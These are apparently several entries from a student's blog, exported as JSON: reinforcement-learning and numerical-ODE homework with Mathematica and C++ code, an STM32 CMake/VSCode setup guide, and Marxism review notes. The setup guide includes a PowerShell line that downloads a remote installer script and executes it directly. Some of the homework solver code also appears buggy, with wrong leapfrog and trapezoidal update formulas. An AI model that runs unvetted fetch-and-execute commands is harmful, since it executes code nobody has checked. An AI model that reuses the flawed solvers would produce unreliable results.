Table[pfunc[a, s, t], {a, 4}, {s, n m}, {t, n m}]; 价值迭代算法 12345678910111213141516valueIteration[r_, p_, v0_, \\[Epsilon]_, \\[Gamma]_] := Module[{k, v, vlast}, k = 0; v = v0; While[k == 0 || Norm[v - vlast] &gt; \\[Epsilon], vlast = v; v = Table[ Max[Table[ r[[a, s]] + \\[Gamma] p[[a, s]] . vlast, {a, Length[r]}]], {s, Length[v0]}]; Print[k, v]; k = k + 1; ]; Print[\"Converged in \", k, \" iterations\"]; Return[v]; ]; 运行算法，得到输出 1v = valueIteration[r, p, ConstantArray[0, n m] , 0.1, 1] 贪心选择策略 1234567greedyPolicy[r_, p_, v_, \\[Gamma]_] := Table[Ordering[ Table[r[[a, s]] + \\[Gamma] p[[a, s]] . v, {a, Length[r]}], -1][[1]], {s, Length[v]}];printPolicyTable[\\[Pi]star_] := ArrayReshape[{\"\\[UpArrow]\", \"\\[DownArrow]\", \"\\[LeftArrow]\", \"\\[RightArrow]\"}[[\\[Pi]star]], {n, m}] // MatrixForm; 运行了 6 轮 第三轮得到的价值表为 {0,0,-1,-2,0,-1,-2,-3,-1,-2,-3,-3,-2,-3,-3,-3}, 对应的策略为 最后得到的价值表为 {0,0,-1,-2,0,-1,-2,-3,-1,-2,-3,-4,-2,-3,-4,-5} 最后的最佳策略为 与第一问得到的结果几乎是一致的。 Problem 3 12345678910111213141516171819202122policyIteration[r_, p_, \\[Pi]0_, \\[Epsilon]_, \\[Gamma]_, n_] := Module[{k, v, \\[Pi], \\[Pi]last}, k = 0; \\[Pi] = \\[Pi]0; v = ConstantArray[0, Length[\\[Pi]0]]; While[k == 0 || Norm[\\[Pi] - \\[Pi]last] &gt; \\[Epsilon], Do[v = Table[r[[\\[Pi][[s]], s]] + \\[Gamma] p[[\\[Pi][[s]], s]] . v, {s, Length[\\[Pi]0]}], n]; \\[Pi]last = \\[Pi]; \\[Pi] = Table[Ordering[ Table[r[[a, s]] + \\[Gamma] p[[a, s]] . v, {a, Length[r]}], -1][[1]], {s, Length[v]}]; Print[\"k = \", k]; Print[\"v = \", v]; Print[\"\\[Pi] = \", \\[Pi]]; k = k + 1; ]; Print[\"Converged in \", k, \" iterations\"]; Return[\\[Pi]]; ]; 1policyIteration[r, p, ConstantArray[1, n m], 0.1, 1, 2] 需要 5 轮收敛 收敛得到的策略与 VI 一致。 收敛得到的价值表与 VI 一致。 第三轮结束时得到的价值表 {0,0,-1,-6,0,-1,-2,-6,-1,-2,-3,-6,-2,-3,-6,-6}, 对应策略表 Problem 4 注意到 VI 可以等价为 的 PI。压缩映射原理保证了直接迭代最优价值函数能收敛，于是 VI 采取了简单直接的迭代做法。PI 则是利用价值来改进策略，但仍然需要用策略来更新对价值的估计。取有限 的 PI 相当于是在在价值的迭代和策略的迭代之间做出了折衷。 很难比较两种做法的效率，VI 的迭代过程虽然更简单，但可能面临精确步长法相比于共轭梯度法的问题，导致总共的迭代次数比 PI 更多。","tags":["强化学习"],"categories":["课程"]},{"title":"微分方程数值解作业 1","path":"/2024/3/10/DE-1/","content":"Problem 1 Question (a) The interpolating linear function: Substitute into (1.56) Question (b) Solve the 2nd order FDE Assume There is always one solution , therefore the method is not A-stable. Question (c) The order of the error of the linear approximation for : The order of the truncation error of FDE: Second ordered method. Problem 2 Euler method Trapezoidal method Backward Euler method Euler method A-Stability: , conditionally A-Stable. L-Stabliity: , not L-Stable. Trapezoidal method A-Stability: is true for all on the left half of the complex plane. It is a-stable. L-Stability: for all on the left half of the complex plane but not for the right. Not L-Stable. Backward Euler method A-Stability: is true for all on the left half of the complex plane. It is A-stable even on partial right complex plane. L-Stability: . It is L-stable. Problem 3 Question (a) FDE for and Question (b) Hamiltonian. Denote , Therefore, when the energy is conserved, it is required that which crossponds to the trapezoid method. In Euler method, The energy decreases. In backward Euler method, The energy increases. Question (c) Deduce FDE for RK2. Denote Only when the matrix on the last line is orthogonal. Therefore RK2 does not conserve the energy. Problem 4 Question (a) Use the one-sided backward numerical differentiation formula Question (b) This method is implicit. Soluiton on the model problem Assume When , both roots are less than 1. BDF2 is zero-stable. Question (c) Denote , 证不来了，画个图看在左半复平面是成立的 Therefore BDF2 is A-stable. Problem 5 123456789101112131415forwardEulerIt[f_, k_, t_, y1_] := y1 + k f[t, y1];backwardEulerIt[f_, k_, t_, y1_] := NSolveValues[y2 == y1 + k f[t + k, y2], y2, Reals][[2]];leapfrogIt[f_, k_, t_, y1_, y2_] := y1 + 2 k f[t, y1];order[leapfrogIt] = 2;trapezoidalIt[f_, k_, t_, y1_] := NSolveValues[y2 == y1 + 1/2 (f[t, y1] + f[t + k, y2]), y2, Reals][[2]];rk4It[f_, k_, t_, y1_] := Module[{k1, k2, k3, k4}, k1 = k f[t, y1]; k2 = k f[t + k/2, y1 + k1/2]; k3 = k f[t + k/2, y1 + k2/2]; k4 = k f[t + k, y1 + k3]; Return[y1 + 1/6 (k1 + 2 k2 + 2 k3 + k4)]; ]; 123456789101112131415161718192021ivpOrder1Solve[f_, y0_, ts_, tt_, m_, method_] := Module[{k, y, ti}, k = (tt - ts)/m; ti = Range[ts, tt, k]; y = ConstantArray[0, Length[ti]]; y[[1]] = y0; Do[y[[i]] = method[f, k, ti[[i - 1]], y[[i - 1]]], {i, 2, Length[ti]}]; Return[ Interpolation[Transpose[{ti, y}], InterpolationOrder -&gt; 1][t]]; ];ivpOrder2Solve[f_, y0_, ts_, tt_, m_, method_] := Module[{k, y, ti}, k = (tt - ts)/m; ti = Range[ts, tt, k]; y = ConstantArray[0, Length[ti]]; y[[1]] = y0; y[[2]] = rk4It[f, k, ti[[1]], y[[1]]]; Do[y[[i]] = method[f, k, ti[[i - 2]], y[[i - 2]], y[[i - 1]]], {i, 3, Length[ti]}]; Return[ Interpolation[Transpose[{ti, y}], InterpolationOrder -&gt; 1][t]]; ]; 12345f[t_, y_] := 10 y (1 - y);y0 = 1/10;ts = 0;tt = 1;exact = DSolveValue[{y'[t] == f[t, y[t]], y[ts] == y0}, y[t], t] 12ndsolve = NDSolveValue[{y'[t] == f[t, y[t]], y[ts] == y0}, y[t], {t, ts, tt}] 1234567891011121314151617getResults[m_] := { exact, ndsolve, ivpOrder1Solve[f, N[y0], ts, tt, m, forwardEulerIt], ivpOrder1Solve[f, N[y0], ts, tt, m, backwardEulerIt], ivpOrder2Solve[f, N[y0], ts, tt, m, leapfrogIt], ivpOrder1Solve[f, N[y0], ts, tt, m, trapezoidalIt], ivpOrder1Solve[f, N[y0], ts, tt, m, rk4It] };methodTitles = {\"Exact\", \"NDSolve\", \"Forward Euler\", \"Backward Euler\", \"Leapfrog\", \"Trapezoidal\", \"RK4\"};plotResults[m_] := Module[{results}, results = getResults[m]; Plot[results, {t, 0, 1}, PlotLegends -&gt; methodTitles, PlotLabel -&gt; StringForm[\"M = ``\", m]] ]GraphicsColumn[plotResults /@ {10, 20, 40}] 1234567891011121314e1 = exact /. t -&gt; 1;getError[method_, m_] := Abs[(ivpOrder1Solve[f, N[y0], ts, tt, Round[m], method] /. t -&gt; 1) - e1];errorplot = LogLogPlot[{getError[forwardEulerIt, m], getError[backwardEulerIt, m], getError[trapezoidalIt, m], getError[rk4It, m]}, {m, 10, 1000}, PlotLegends -&gt; {\"Forward Euler\", \"Backward Euler\", \"Trapezoidal\", \"RK4\"}]ticklines = LogLogPlot[{1/m, 1/m^2, 1/m^4}, {m, 10, 1000}, PlotStyle -&gt; Dashed, PlotLegends -&gt; \"Expressions\"]Show[ticklines, errorplot]","tags":["微分方程"],"categories":["课程"]},{"title":"强化学习作业 1","path":"/2024/3/7/RL-1/","content":"Problem 1 有问题。从人的经验来看，仅仅依靠位置信息不能做出是否加减速、转弯的决策，关于是否有障碍、障碍的位置、移动速度、自身的方向和速度等信息都应该纳入状态之中作为决策依据。 Problem 2 考虑为乘除法的回报设置更大的权重，和 / 或衰减已经大量练习的题目的回报 Problem 3 井字棋比较简单，总状态数不多，翻出旧代码来按照题意做一个简单的概率 DP 即可。仅在 “必胜” 招后回报为 1 可以理解为只有赢了回报为 1. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;string&gt;using int64 = long long;using uint64 = unsigned long long;using uint32 = unsigned int;struct state { uint32 u; inline constexpr state(uint32 u) : u(u) {} inline constexpr operator uint32() const { return u; } inline constexpr state(const std::string&amp; str) : u(0) { for (int i = 0; i &lt; 9; i++) { uint32 val = 0; if (str[i] == 'x') { val = 1; } else if (str[i] == 'o') { val = 2; } else { val = 0; } u |= val &lt;&lt; (i * 2); } } int check_win(); inline constexpr int get(int idx) const { return (u &gt;&gt; (idx * 2)) &amp; 0x3; } inline constexpr void set(int idx, int val) { u &amp;= ~(0x3 &lt;&lt; (idx * 2)); u |= uint32(val) &lt;&lt; (idx * 2); }};inline state final_state[] = { state(\"xxx \"), state(\" xxx \"), state(\" xxx\"), state(\"x x x \"), state(\" x x x \"), state(\" x x x\"), state(\"x x x\"), state(\" x x x \"),};inline int state::check_win() { for (int i = 0; i &lt; 8; i++) { if ((final_state[i].u &amp; u) == final_state[i].u) return 1; if (((final_state[i].u &lt;&lt; 1) &amp; u) == (final_state[i].u &lt;&lt; 1)) return -1; } return 0;} 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;utility&gt;void print_state(state st) { for (int i = 0; i &lt; 9; i++) { if (st.get(i) == 0) std::cout &lt;&lt; i &lt;&lt; \" \"; else if (st.get(i) == 1) std::cout &lt;&lt; \"X \"; else std::cout &lt;&lt; \"O \"; if (i % 3 == 2) std::cout &lt;&lt; std::endl; } std::cout &lt;&lt; std::endl;}std::map&lt;state, double&gt; memo;double dfs(state st, bool current_x) { if (memo.find(st) != memo.end()) return memo[st]; int res = st.check_win(); if (res != 0) { if (res == 1) return memo[st] = 1; else return memo[st] = 0; } if (current_x) { // X's turn // Choose the best move double best = 0; for (int i = 0; i &lt; 9; i++) { if (st.get(i) == 0) { state new_st = st; new_st.set(i, 1); best = std::max(best, dfs(new_st, false)); } } return memo[st] = best; } else { // O's turn // Prevent X from instantly winning, otherwise move in equal probability double total = 0; int cnt = 0; for (int i = 0; i &lt; 9; i++) { if (st.get(i) == 0) { state new_st = st; new_st.set(i, 1); if (new_st.check_win() == 1) { new_st.set(i, 2); return memo[st] = dfs(new_st, true); } new_st.set(i, 2); total += dfs(new_st, true); cnt++; } } return memo[st] = total / cnt; }}int main() { state st(\"x o \"); dfs(st, true); for (int i = 0; i &lt; 9; i++) { if (st.get(i) == 0) { state new_st = st; new_st.set(i, 1); print_state(new_st); std::cout &lt;&lt; \"Winning probability: \" &lt;&lt; memo[new_st] &lt;&lt; std::endl; } }} 程序输出给定策略下各动作的期望回报 1234567891011121314151617181920212223242526272829303132333435X X 23 O 56 7 8Winning probability: 0X 1 X3 O 56 7 8Winning probability: 0X 1 2X O 56 7 8Winning probability: 0X 1 23 O X6 7 8Winning probability: 0.541667X 1 23 O 5X 7 8Winning probability: 0.25X 1 23 O 56 X 8Winning probability: 0.541667X 1 23 O 56 7 XWinning probability: 0.666667 所以下一步应该走对角 Problem 4 很显然的，游戏 AI。电子游戏很明显符合序贯决策模型，但是设计应用于许多游戏的强化学习算法可能很困难，因为游戏中的信息非常丰富，设计合适的状态表示是艰巨的任务；同时动作集也很庞大，可以做出多种类型的动作，动作甚至可以是连续的。收益可以定义为单局游戏的最终胜利，但也有许多细化定义的空间。 我最感兴趣的是强化学习在 LLM 上的应用。现在的 LLM 多使用强化学习使其能产生符合人类期望的对话。应当是把与用户对话的过程作为一个序贯决策的过程？在这个模型中，状态和动作似乎都涉及到深度网络的表示，回报是人类对对话过程喜好的主观打分。","tags":["强化学习"],"categories":["课程"]},{"title":"强化学习作业 2","path":"/2024/3/7/RL-2/","content":"Problem 1 状态价值的 Bellman 期望方程 在本问题中, 展开得到关于 的方程组 即 其中 表示在 向左走的概率。求解线性方程组即可得到各个状态价值。容易得到方程组的解是 注意到 时， 取最大值 ，事实上，这就是最优策略，此时除了 的所有状态的最优价值都是 10. 正常的考虑，右端的收益大于左端，并且风再大也不会导致倒退，顶多原地不动，所以总是贪心地选择向右。 而这个线性方程组可以观察其他情况，比如等概率随机游走： Problem 2 我们总是可以像上题那样列出所有状态的 Bellman 期望方程，得到一个含有策略 作为参数的满秩线性方程组，从而将 写成关于 的显函数。随后可通过梯度下降等方法来优化 使 最大。(但是, 参见上一问解得的含 参数的 表达式, 这个优化问题可能是病态的). 另外, 考虑到最优策略一定会收敛到单点分布, 可以枚举最优策略. 只需如上题求解线性方程组。列出每个状态的状态价值，组成方程组 线性方程组满秩，求解得到","tags":["强化学习"],"categories":["课程"]},{"title":"在 VSCode 上使用 CMake 开发 STM32CubeMX 项目","path":"/2024/3/1/STM32-CMake/","content":"本文提供了一种在 VSCode 上基于 CMake 开发 STM32CubeMX 项目的方案，配置了 Clangd 以获得更好的静态检查，并使用 Ninja 加快编译速度。本文的 CMake 配置文件能从 STM32CubeMX 生成的 Makefile 中读取编译参数，能自动同步 CubeMX 中的更改，也能在 CubeMX 重新生成项目时保留自定义选项。本文中的配置文件理论上适用于 Windows, Linux 和 macOS. 由于芯片相关信息是从 Makefile 中读取的, 本文的配置文件理论上适用于所有 STM32CubeMX 支持的 MCU. 需要安装的软件 不需要 Keil! 需要安装以下编译和调试工具, 并将其添加到系统 PATH 中. 在 Windows 上推荐使用 Scoop. Scoop 能自动下载安装这些工具 (需要好的网络连接), 并将其添加到 PATH. gcc-arm-none-eabi openocd cmake llvm (提供 clangd 和 clang-format) ninja (加快编译速度) 可以使用 scoop install 这些软件包的最新版本, 安装后建议重启所有打开的 VSCode 窗口以应用更改. 只需在 PowerShell 中运行以下命令即可安装所有软件包: 1234567# 如果你还没有安装 ScoopSet-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUserInvoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression# 安装软件包scoop bucket add extrasscoop install gcc-arm-none-eabi openocd cmake llvm ninja 另外还需要安装以下来自 ST 的软件 STM32CubeMX STM32CubeProgrammer (取代 ST-Link Utility, 提供烧录需要的驱动程序) 还需要以下 VSCode 插件. 使用下列的配置文件打开项目后, 会自动提示安装. ms-vscode.cpptools llvm-vs-code-extensions.vscode-clangd ms-vscode.cmake-tools marus25.cortex-debug 使用方法 https://github.com/Duanyll/stm32cubemx-vscode-cmakehttps://github.com/Duanyll/stm32cubemx-vscode-cmake 使用 STM32CubeMX 正常地创建并配置项目, 需要如图选择 Makefile 类型的项目, 然后点击 Generate Code 生成项目 打开生成的项目, 将 代码仓库 中的 CMakeLists.txt 和 .vscode 文件夹放置在与 ioc 文件相同的目录 用 VSCode 打开文件夹, 并用 CMake 插件配置 (Configure) 项目. 提示选择 Kit 时, 由于配置文件中已指定使用 gcc-arm-none-eabi, 直接选择 [Unspecified]. (请确保编译器已在 PATH 中, 使用 Scoop 安装会自动添加 PATH) 首次配置后, 重新启动或者刷新 VSCode, clangd 应当已经能正常工作, 能正确的找到系统头文件 按这个编译 这个选项已配置成编译并下载 按这个编译，下载并调试 如果需要新增源文件或动态库，可以直接在 CMakeLists.txt 中添加，不会在 CubeMX 重新生成时被覆盖. 添加后需重新配置 (Configure) 项目. 上方的 CMakeLists.txt 中有一个在 Cortex M7 设备上使用 CMSIS-DSP 库的例子. 如果 OpenOCD 烧录失败, 可尝试用 STM32CubeProgrammer 更新 ST-Link 固件版本.","tags":["vscode","电子设计","cmake","指北","stm32"],"categories":["技术"]},{"title":"马原2","path":"/2024/1/3/Marxism-2/","content":"绪论 马克思主义的鲜明特征 科学性 实践性 (革命性) 人民性 发展性 马克思主义的当代价值 观察当代世界变化的认识工具 指引当代中国发展的行动指南 引领人类社会进步的科学真理 如何自觉和运用马克思主义 努力学习和掌握马克思主义的基本立场观点方法 努力学习和掌握马克思主义中国化时代化的理论成果 坚持理论联系实际的马克思主义学风 自觉将马克思主义内化于心、外化于行 世界的物质性及发展规律 马克思物质范畴的理论意义 物质是标志客观实在的理论范畴. 物质不依赖于人的意识而存在, 物质是能为意识反映的客观实在. 理论意义: 坚持唯物主义一元论, 同唯心主义一元论和二元论划开界限 坚持能动的反映论和可知论, 批判不可知论 体现了唯物论和辩证法的统一 体现了唯物主义自然观和历史观的统一 物质对意识决定作用的表现 意识的起源: 意识是自然界长期发展的产物 意识是社会历史发展的产物 意识的本质: 意识是人脑这一特殊物质的机能和属性, 是客观世界的主观映象 意识对物质能动作用的表现 意识具有目的性, 计划性 意识具有创造性 意识具有指导实践改造客观世界的作用 意识具有调控人的行为和生理活动的作用 如何处理好主观能动性和客观规律性的关系 物质和意识的辩证关系: 尊重客观规律是正确发挥主观能动性的前提 只用充分发挥主观能动性, 才能正确认识和利用客观规律 正确发挥主观能动性的前提条件 从实际出发是正确发挥主观能动性的前提 实践是正确发挥人的主观能动性的根本途径 正确发挥人的主观能动性依赖于一定的物质条件和手段 历史主动精神 人工智能是否能真的具有人的意识 (属于是唯心了) 人类意识是知情意的统一体，而人工智能只是对人类的理性智能的模拟和扩展，不具备情感、信念、意志等人类意识形式 社会性是人的意识所固有的本质属性，而人工智能不可能真正具备人类的社会属性 人类的自然语言是思维的物质外壳和意识的现实形式，而人工智能难以完全具备理解自然语言真实意义的能力。 人工智能能够获得人类意识中可以化约为数字信号的内容，但人脑中总有许多东西是无法被化约的。不知所云 什么是世界的物质统一性 世界是统一的, 世界的本源只有一个, 世界的统一性在于他的物质性. 物质世界的统一是多样性的统一. 自然界是物质的 人类社会本质上是物质的 人的意识统一于物质, 意识是物质世界长期发展的产物 联系的特点 客观性 普遍性 任何事物内部不同要素相互联系, 具有内在的结构性 任何事物不能孤立存在, 同其他事物处在一定的联系之中 整个世界是相互联系的统一整体 多样性: 直接/间接, 内部/外部, 本质/非本质, 必然/偶然 条件性 条件对事物发展和人的活动有支持和制约作用 条件是可以改变的 矛盾同一性和斗争性的表现 内涵: 相互依存 相互贯通 相互排斥 相互分离 意义: 同一性是是事物存在和发展的前提 同一性使矛盾双方吸收有利于自己的因素 同一性规定事物转化的可能和发展的趋势 斗争促使双方的力量发生变化, 造成发展不平衡, 为对立面的转化, 事物的质变创造条件 斗争是向另一种矛盾统一体转化的决定性条件 量变和质变的辩证关系 量变是质变的必要条件 质变是量变的必然结果, 为新的量变开辟道路 量变和质变是相互渗透的 方法论: 事物的发展处于量变阶段时，要踏实做好日常工作，为未来重大改变做准备。 当质变来临时, 要果断的, 不失时机的抓住机会, 促成质变, 使工作迈上新台阶 什么是唯物辩证法的否定观 否定之否定规律是辩证的否定观 否定是事物的自我否定, 自我发展, 是事物内部矛盾运动的结果 否定是事物发展的环节, 是旧事物向新事物的转变, 从旧到新质的飞跃. 否定是新旧事物联系的环节, 新事物孕育产生于旧事物, 通过否定联系在一起. 辩证否定的实质是”扬弃”, 即新事物对旧事物即批判又继承, 即克服其消极因素又保留其积极因素. 意义：树立辩证的否定观，反对形而上学的肯定一切、否定一切，对事物采取科学分析的态度，使实践活动符合事物自我否定的辩证本性。正确的看待事物发展的过程，既要看到道路的曲折，更要看到前途的光明。 唯物辩证法的本质特征和认识功能 唯物辩证法本质上是批判和革命的 唯物辩证法是客观辩证法和主观辩证法的统一 唯物辩证法是科学的认识方法 辩证思维方法有哪些 提高辩证思维能力，要自觉运用对立统一规律，掌握运用好辩证的逻辑思维方法 归纳与演绎 分析与综合 抽象与具体 逻辑与历史 时间与认识及其发展规律 科学实践观创立发展的意义 克服了旧唯物主义的根本缺陷, 为辩证唯物主义的创立奠定了科学的理论基础 解释了实践对认识的决定作用, 为能动的, 革命的反映论的创立奠定了科学的理论基础 在人类思想史上第一次揭示了社会生活的实践本质, 为唯物史观的创立奠定了科学的理论基础 为人们能动地认识世界和改造世界提供了基本的思想方法和工具 实践的基本特征 客观实在性 自觉能动性 社会历史性 实践的基本结构 实践主体: 具有一定的主体能力, 从事现实社会实践活动的人 实践客体: 实践活动所指向的对象 实践中介: 各种形式的工具手段和操作这些工具手段的程序和方法 物质性工具系统 语言符号工具系统 实践的形式 物质生产实践 社会政治实践 科学文化实践 实践对认识的决定作用 实践是认识的来源 实践是认识发展的动力 实践是认识的目的 石剑是检验真理的唯一标准 感性认识与理性认识的辩证统一 理性认识依赖于感性认识 感性认识有待于发展和深化为理性认识 感性认识和理性认识相互渗透, 相互包含 感性认识上升到理性认识的条件 投身实践，深入调查，获取十分丰富和合乎实际的感性材料 经过思考的作用，运用理论思维和科学抽象，将丰富的感性材料加以去粗取精、去伪存真、由此及彼、由表及里的处理加工，形成概念和理论的系统 认识到实践的必要性和重要性 认识世界的目的是改造世界 认识的真理性只有在实践中才能得到检验和发展 什么是真理的客观性 真理的客观性指真理的内容是对客观事物及其规律的正确反映, 真理中包含着不依赖于人和人的意识的客观内容. 真理的客观性决定了真理的一元性, 真理的一元性指的是在同一条件下对于特定的认识客体的真理性认识只有一个. 什么是真理的绝对性和相对性 真理的绝对性: 真理的绝对性指整理主客观统一的确定性和发展的无限性. 任何真理都标志着主观与客观相符合, 包含着不依赖于人和人的意识的客观内容 人类认识按期本性来说, 能够正确认识无限发展着的物质世界 真理的相对性: 人们在一定的条件下对客观事物的及其发展规律的正确认识总是优先度的, 不完善的 从客观世界的整体来看, 任何真理都只是对客观世界某一阶段. 某一部分的正确认识 就特定事物而言, 任何真理理都只是对客观对象一定方面、一定层次和一定程度的正确认识 真理的绝对性和相对性的辩证统一: 相互依存, 相互包含 真理和谬误的对立统一 真理和谬误相互对立 真理与谬误的对立是相对的, 在一定条件下能够相互转化 真理和谬误相比较而存在, 相斗争而发展 为什么实践是检验真理的唯一标准 从真理的本性来看, 真理是人们对客观事物及其发展规律的正确反映, 本性在于主观和客观相符合, 检验真理就是检验人的主观认识和客观现实相符合的程度 从实践的特点来看, 实践具有直接现实性. 什么是实践标准的确定性和不确定性 确定性即绝对性: 实践作为检验真理标准的唯一性 不确定性即相对性 任何实践都收到主客观条件的制约, 具有不可能完整证实或驳倒一切认识的什么是实践标准的确定性和不确定性 实践是社会的, 历史的实践, 由于历史条件的种种限制, 时间对真理的检验具有什么是实践标准的确定性和不确定性, 有限性 价值的基本特征 主体性 价值关系的形成依赖于主体的存在 价值关系的形成依赖于主体是创造, 使客体潜在的价值转化为现实的价值 客观性 主体的存在和需要是客观的 客体的存在, 属性和作用是客观的 价值的多维性 价值的社会历史性 价值评价的特点 评价以主客体之间的价值关系为认识对象 评价结果与评价主体直接相关 评价结果的正确性与否依赖于对客体状况和主体需要的认识 价值评价有科学与非科学之别 真理与价值的关系 价值尺度必须以真理为前提 人类自身需要的内在尺度推动着人们不断发现新的真理 认识世界和改造世界的关系 相互依赖, 相互制约的辩证关系: 认识世界有助于改造世界, 正确认识世界是改造世界的必要前提 人们只有在改造世界的实践中才能不断地深化, 拓展对世界的正确的认识 客观世界与主观世界的辩证关系 只有在改造客观世界的实践中, 才能深入改造主观世界 只有认真改造主观世界, 才能更好的改造客观世界 理论创新与实践创新的关系 实践创新为理论创新提供不竭的动力源泉 理论创新为实践创新提供科学的行动指南 人类社会及其发展规律 为什么说生产方式是社会历史发展的决定力量 物质生产活动及生产方式是人类社会赖以存在和发展的基础, 是人类其他一切活动的前提 物质生产活动及生产方式决定社会的结构, 性质, 面貌, 制约人们经济生活, 政治生活和精神生活等全部社会生活 物质生产活动及生产方式的变化发展决定整个社会历史的变化发展, 决定社会形态从低级向高级的更替和发展 社会存在和社会意识的辩证关系 社会存在决定社会意识 社会意识是社会存在的反映 社会意识反作用于社会存在 社会意识独立性的表现 社会意识与社会存在发展具有不完全同步性和不平衡性 社会意识内部各种形式之间存在相互影响且各自具有历史继承性 社会意识对社会存在具有能动的反作用 文化对社会发展的重要作用 没有什么作用, 毕竟是文化荒漠捏 文化为社会发展提供思想指引 文化为社会发展提供精神动力 文化为社会发展提供凝聚力量 生产力的基本要素 劳动资料 劳动对象 劳动者 科学技术是生产力的重要因素 生产力和生产关系的关系 生产力决定生产关系 生产关系对生产力具有能动的反作用 生产力与生产关系的相互作用是一个过程，表现为二者的矛盾运动 经济基础和上层建筑的辩证统一关系 经济基础决定上层建筑 上层建筑对经济基础具有反作用 经济基础与上层建筑的相互作用构成二者的矛盾运动 经济基础和上层建筑之间的内在联系构成了上层建筑一定要适合经济基础状况的规律 人民的历史选择性 选择不了一点 第三，人们的历史选择性归根结底是人民群众的选择性。人们对于社会形态的历史选择最终取决于人民群众的根本利益、根本意愿以及对社会发展规律的把握和顺应程度。历史是人民群众创造的，人民群众是社会形态变革的决定力量。人民群众对于社会形态的历史选择，正是在遵循社会发展客观规律的基础上，通过参与社会变革实现的。因此，历史的发展、社会形态更替的规律，归根结底会通过人民的意志和人民的选择表现出来。 社会基本矛盾在历史发展中的作用 生产力是社会基本矛盾运动中最基本的动力因素, 是人类社会发展和进步的最终决定力量 生产力是社会进步的根本内容, 是衡量社会进步的根本尺度 社会基本矛盾决定着社会中其他矛盾的存在和发展 社会基本矛盾具有不同的表现形式和解决方式, 并从根本上影响和促进社会形态的变化和发展 社会革命的地位和实质 社会革命是阶级斗争的最高形式, 其实质是革命阶级推翻反动阶级的统治, 用新的社会制度代替旧的社会制度 社会革命在社会发展中的重要作用 社会革命是实现社会形态更替的重要手段和决定性环节 革命能充分发挥人民群众创造历史的积极性和伟大作用 革命斗争还能够极大地教育和锻炼包括革命阶级在内的广大人民群众 科技革命对社会发展的作用 科技革命是推动经济和社会发展的强大杠杆 对生产方式产生了深刻影响 对生活方式产生了巨大影响 促进了思维方式的变革 唯物史观坚持的原则 唯物史观立足于现实的人及其本质来把握历史的创造者 唯物史观立足于整体的社会历史过程来探究谁是历史的创造者 唯物史观从社会历史发展的必然性入手来考察和说明谁是历史的创造者 唯物史观从人与历史关系的不同层次上考察谁是历史的创造者 人民群众在创造历史中的决定作用 人民群众是社会物质财富的创造者 人民群众是社会精神财富的创造者 人民群众是社会变革的决定力量 人民群众创造历史的活动收到一定社会历史条件的制约 马克思主义群众路线的内容 群众观点: 坚信人民群众自己解放自己 全心全意为人民服务 一切向人民群众负责 虚心向人民群众学习 群众路线 一切为了群众, 一切依靠群众 从群众中来, 到群众中去 资本主义的本质及规律 商品使用价值和价值的对立统一关系 对立: 使用价值和价值不可兼得 统一: 商品必须同时具有价值和使用价值 劳动二重性的对立统一关系 对立: 反映劳动的不同属性 统一: 时间空间的统一 货币的基本职能 价值尺度 流通手段 储藏手段 支付手段 世界货币 价值规律的表现和对市场配置资源的作用 内容: 商品生产和商品交换的基本规律. 商品的价值量由生产商品的社会必要劳动时间决定, 商品交换以价值量为基础, 以等价交换为原则 表现形式: 商品的价格围绕商品的价值自发波动 作用: 自发的调节生产资料和劳动力在社会各生产部门间的分配比例 自发的刺激社会生产力的发展 自发的调节社会收入的分配 导致社会资源浪费 阻碍社会进步 导致收入两极分化 商品经济的基本矛盾 私人劳动和社会劳动的矛盾 马克思劳动价值论的理论实践意义 扬弃了英国古典政治经济学的观点, 为剩余价值论的创立奠定了基础 揭示了私有制条件下商品经济的基本矛盾, 为从物与物的官泄背后揭示人与人的关系提供了理论依据 揭示了商品经济的一般规律, 对理解社会主义市场经济具有指导意义 如何深化对马克思劳动价值论的认识 深化对创造价值的劳动的认识, 对生产性劳动做出新的界定 深化对科技人员, 经营管理人员在社会生产和价值创造中所起所用的认识 深化对价值创造与价值分配关系的认识 劳动力成为商品的基本条件 劳动者在法律上是私有人, 能够把自己的劳动力当作商品来支配 劳动者没有任何生产资料, 没有生活资料来源, 不得不依靠出卖劳动力维生 劳动力商品的特点 价值: 生产, 发展, 维持和延续劳动力所必需的生活必需品的价值 维持本人生存 (最低界限) 维持家人生存 教育和训练 使用价值: 是价值的源泉, 在消费中能创造新的价值, 新的价值比劳动力本身的价值更大 资本主义生产过程的二重性 劳动过程和价值增值过程 资本循环的过程和产业资本运动的条件 货币资本 生产资本 商品资本 条件: 三种形式在空间上并存, 时间上继起 资本主义经济危机爆发的根本原因 资本主义经济危机爆发的根本原因是资本主义的基本矛盾, 生产社会化和生产资料资本主义私人占有之间的矛盾, 表现为两个方面 生产无限扩大的趋势与劳动人民有支付能力的需求相对缩小的矛盾 单个企业内部生产的有组织性和整个社会生产的无政府状态之间的矛盾","tags":["马原","废话"],"categories":["课程"]},{"title":"马原1","path":"/2024/1/1/Marxism-1/","content":"《马克思主义基本原理概论》期末复习指南 闭卷考试范围：绪论——第四章 二、思考题： 第0章 绪论 1、什么是马克思主义和马克思主义基本原理 p2-3 马克思主义：由马克思恩格斯创立并为后继者所不断发展的科学理论体系，是关于自然、社会和人类思维发展一般规律的学说，是关于社会主义必然代替资本主义、最终实现共产主义的学说，是关于无产阶级解放、全人类解放和每个人自由全面发展的学说，是无产阶级政党和社会主义国家的指导思想，是指引人民创造美好生活的行动指南。 马克思主义三个基本组成部分：马克思主义哲学、马克思主义政治经济学和科学社会主义。 马克思主义基本原理：是对马克思主义的立场、观点、方法的集中概括，是马克思主义在形成、发展和运用过程中经过实践反复检验而确立起来的具有普遍真理性的理论。 2、马克思主义的特征 p9-12 特征： 人民性：人民至上是马克思主义的政治立场 科学性：科学的方法论和世界观，辩证唯物主义和历史唯物主义。 实践性：从实践中来，到实践中去，在实践中接收检验，随实践而不断发展 发展性：不断发展的学说，有与时俱进的理论品质。 第一章 世界的物质性及发展规律 3、哲学和哲学的基本问题、社会历史观的基本问题（两种根本对立的历史观）。P21 哲学：系统化、理论化的世界观。 哲学的基本问题：存在和思维的问题，又称物质和意识的问题。 基本问题两个内容： 1、存在和思维及物质和意识谁为本原：唯心主义、唯物主义。 2、存在和思维、物质和意识是否具有同一性：可知论、不可知论。 